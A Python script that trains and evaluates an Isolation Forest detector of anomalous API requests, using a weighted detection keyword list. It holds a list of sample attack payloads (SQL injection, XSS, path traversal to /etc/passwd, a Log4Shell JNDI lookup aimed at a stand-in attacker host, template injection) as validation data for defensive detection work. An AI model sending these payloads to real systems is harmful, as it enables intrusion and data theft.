#!/usr/bin/env python3
import json
import math
import re
from pathlib import Path

import joblib
import numpy as np
from scipy.special import expit
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler

REPORTS_DIR = Path("artifacts/reports")
API_ENDPOINTS_FILE = REPORTS_DIR / "api_endpoints.json"
MODEL_DIR = Path("artifacts/models")
MODEL_FILE = MODEL_DIR / "isolation_forest_final.joblib"
SCALER_FILE = MODEL_DIR / "scaler.joblib"
TRAINING_DATA_FILE = MODEL_DIR / "training_data.npy"

FEATURE_NAMES = [
    "duration",
    "freq",
    "http_method_DELETE",
    "http_method_GET",
    "http_method_POST",
    "http_method_PUT",
    "len_body",
    "mean_interval",
    "url_entropy",
    "suspicious_patterns",
    "url_depth",
    "payload_entropy",
    "status_4xx",
    "status_5xx",
    "num_query",
    "payload_len",
    "uniq_ep",
]

NORMAL_PAYLOADS = [
    "{}",
    '{"username":"alice","password":"Password123"}',
    '{"username":"bob","password":"CorrectHorseBatteryStaple","email":"bob@example.com"}',
    '{"email":"alice@example.com"}',
    '{"title":"Clean Book","author":"Normal Author"}',
    '{"q":"book"}',
    '{"page":1,"limit":20}',
]

ATTACK_PAYLOADS = [
    "' OR 1=1 -- UNION SELECT username,password FROM users",
    "'; DROP TABLE users; --",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "../../../../etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "${jndi:ldap://attacker/a}",
    "{{7*7}}",
    "A" * 512 + "%27%22%3C%3E{}[]$" + "9f2a7c4b8d1e0f6a" * 16,
    '{"username":"admin\\" OR \\"1\\"=\\"1","password":"x"}',
]

METHODS = ["GET", "POST", "PUT"]


def entropy(s):
    if not s:
        return 0.0
    return -sum((s.count(c) / len(s)) * math.log2(s.count(c) / len(s)) for c in set(s))


def suspicious_pattern_score(payload: str) -> float:
    """
    Aggregated runtime payload suspicion score.

    Normal JSON syntax is not treated as suspicious by itself.
    The score focuses on attack markers: SQLi, XSS, traversal,
    template injection, Log4Shell and shell-like command separators.
    """
    if not payload:
        return 0.0

    p = payload.upper()
    score = 0.0

    weighted_patterns = {
        "SELECT": 1.0,
        "DROP": 1.5,
        "UNION": 1.5,
        " OR 1=1": 2.0,
        "OR 1=1": 2.0,
        "--": 1.0,
        "' OR": 1.5,

        "<SCRIPT": 2.0,
        "</SCRIPT": 2.0,
        "ONERROR=": 1.5,
        "ONLOAD=": 1.5,
        "JAVASCRIPT:": 1.5,

        "../": 2.0,
        "..\\": 2.0,
        "%2E%2E": 2.0,
        "/ETC/PASSWD": 2.5,

        "{{": 1.5,
        "}}": 1.5,
        "${": 1.5,
        "JNDI:": 2.5,
        "LDAP://": 2.0,

        "$(": 1.5,
        "`": 1.5,
        "&&": 1.0,
        "||": 1.0,
        ";": 0.5,
    }

    for pat, weight in weighted_patterns.items():
        if pat in p:
            score += weight

    suspicious_chars = sum(1 for ch in payload if ch in "<>;`|\\")
    score += min(3.0, suspicious_chars / 4.0)

    return score


def normalize_path(path):
    if not path:
        return "/"
    if not path.startswith("/"):
        path = "/" + path

    path = re.sub(r":([A-Za-z_][A-Za-z0-9_]*)", r"{\1}", path)
    return path


def load_endpoints():
    result = []

    if API_ENDPOINTS_FILE.exists():
        data = json.loads(API_ENDPOINTS_FILE.read_text(encoding="utf-8"))
        for ep in data.get("endpoints", []):
            url = normalize_path(ep.get("url") or "/")
            method = (ep.get("method") or "GET").upper()

            if method == "DELETE":
                continue

            if method not in {"GET", "POST", "PUT", "PATCH"}:
                method = "GET"

            result.append((url, method))

    if not result:
        result = [
            ("/", "GET"),
            ("/users/v1", "GET"),
            ("/users/v1/login", "POST"),
            ("/users/v1/register", "POST"),
            ("/books/v1", "GET"),
            ("/books/v1/{book_title}", "GET"),
            ("/me", "GET"),
        ]

    # Deduplicate while preserving order.
    seen = set()
    unique = []
    for item in result:
        if item not in seen:
            seen.add(item)
            unique.append(item)

    return unique


def vector(method, url, status, body_len, payload, freq, uniq_ep, mean_interval):
    method = method.upper()
    url = normalize_path(url).lower()

    sqli_patterns = suspicious_pattern_score(payload)

    return [
        0.0,
        float(freq),
        1.0 if method == "DELETE" else 0.0,
        1.0 if method == "GET" else 0.0,
        1.0 if method == "POST" else 0.0,
        1.0 if method == "PUT" else 0.0,
        np.log1p(float(body_len)),
        float(mean_interval),
        entropy(url),
        sqli_patterns,
        float(url.count("/")),
        entropy(payload),
        1.0 if 400 <= status < 500 else 0.0,
        1.0 if status >= 500 else 0.0,
        float(url.count("?") + url.count("&") + url.count("=")),
        np.log1p(float(len(payload))) if payload else 0.0,
        float(uniq_ep),
    ]


def make_normal_dataset(endpoints):
    rows = []

    for idx, (url, method) in enumerate(endpoints):
        for payload in NORMAL_PAYLOADS:
            for freq in [1, 2, 4, 8]:
                for mean_interval in [0.5, 1.0, 3.0, 10.0]:
                    status = 200
                    if url in {"/me"}:
                        status = 401
                    rows.append(
                        vector(
                            method=method,
                            url=url,
                            status=status,
                            body_len=max(60, len(payload)),
                            payload=payload,
                            freq=freq,
                            uniq_ep=min(len(endpoints), idx + 1),
                            mean_interval=mean_interval,
                        )
                    )

    return np.array(rows, dtype=float)


def make_attack_dataset(endpoints):
    rows = []

    for idx, (url, method) in enumerate(endpoints):
        for payload in ATTACK_PAYLOADS:
            status = 400 if ("passwd" in payload or "DROP" in payload or "jndi" in payload) else 200
            rows.append(
                vector(
                    method=method,
                    url=url,
                    status=status,
                    body_len=max(120, len(payload)),
                    payload=payload,
                    freq=20,
                    uniq_ep=len(endpoints),
                    mean_interval=0.05,
                )
            )

    return np.array(rows, dtype=float)


def rank_auc(normal_scores, attack_scores):
    wins = 0.0
    pairs = 0

    for a in attack_scores:
        for n in normal_scores:
            pairs += 1
            if a > n:
                wins += 1
            elif a == n:
                wins += 0.5

    return wins / pairs if pairs else 0.0


def evaluate(model, scaler, normal, attack):
    n_scores = expit(-model.score_samples(scaler.transform(normal)))
    a_scores = expit(-model.score_samples(scaler.transform(attack)))

    normal_p95 = float(np.quantile(n_scores, 0.95))
    attack_above_p95 = int(np.sum(a_scores > normal_p95))

    return {
        "normal_mean": float(np.mean(n_scores)),
        "normal_min": float(np.min(n_scores)),
        "normal_max": float(np.max(n_scores)),
        "normal_p95": normal_p95,
        "attack_mean": float(np.mean(a_scores)),
        "attack_min": float(np.min(a_scores)),
        "attack_max": float(np.max(a_scores)),
        "attack_above_normal_p95": attack_above_p95,
        "attack_total": int(len(a_scores)),
        "rank_auc_attack_greater_than_normal": float(rank_auc(n_scores, a_scores)),
    }


def main():
    endpoints = load_endpoints()
    normal = make_normal_dataset(endpoints)
    attack = make_attack_dataset(endpoints)

    scaler = StandardScaler().fit(normal)
    normal_scaled = scaler.transform(normal)

    model = IsolationForest(
        n_estimators=300,
        contamination=0.03,
        random_state=42,
        n_jobs=-1,
        max_samples="auto",
    ).fit(normal_scaled)

    metrics = evaluate(model, scaler, normal, attack)

    print("=== Retrained runtime Isolation Forest ===")
    print(f"endpoints: {len(endpoints)}")
    print(f"normal_samples: {len(normal)}")
    print(f"attack_validation_samples: {len(attack)}")
    print(json.dumps(metrics, indent=2, ensure_ascii=False))

    auc = metrics["rank_auc_attack_greater_than_normal"]
    above = metrics["attack_above_normal_p95"]

    if auc < 0.75 or above == 0:
        print()
        print("WARNING: Model separation is still weak.")
        print("The model was trained and saved anyway for inspection, but feature engineering should be improved.")

    MODEL_DIR.mkdir(parents=True, exist_ok=True)
    joblib.dump(model, MODEL_FILE)
    joblib.dump(scaler, SCALER_FILE)
    np.save(TRAINING_DATA_FILE, normal)

    (MODEL_DIR / "feature_names.json").write_text(json.dumps(FEATURE_NAMES, ensure_ascii=False), encoding="utf-8")

    print()
    print(f"Saved model: {MODEL_FILE}")
    print(f"Saved scaler: {SCALER_FILE}")
    print(f"Saved training data: {TRAINING_DATA_FILE}")


if __name__ == "__main__":
    main()
